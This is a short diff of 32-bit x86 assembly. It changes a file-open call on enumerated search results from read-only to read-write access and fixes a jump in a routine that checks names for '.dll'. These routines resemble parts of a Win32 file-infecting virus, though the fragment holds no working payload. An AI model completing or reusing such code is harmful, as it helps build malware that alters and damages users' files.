@@ -292,7 +292,7 @@ open_file:
    	push eax
    	inc eax
     	push eax
-   	push 80000000h
+   	push 0c0000000h
     	lea eax,[ebp+win32_find_data.FileName] 
     	add eax,ebx
     	push eax 
@@ -348,7 +348,7 @@ ker1:
 	inc ecx				; else ecx+=1
 ker2:	
 	cmp dword ptr[ebx+8],"lld."	;
-	jne az3				;
+	jne ker3				;
 	inc ecx				; else ecx+=1
 ker3:	
 ret
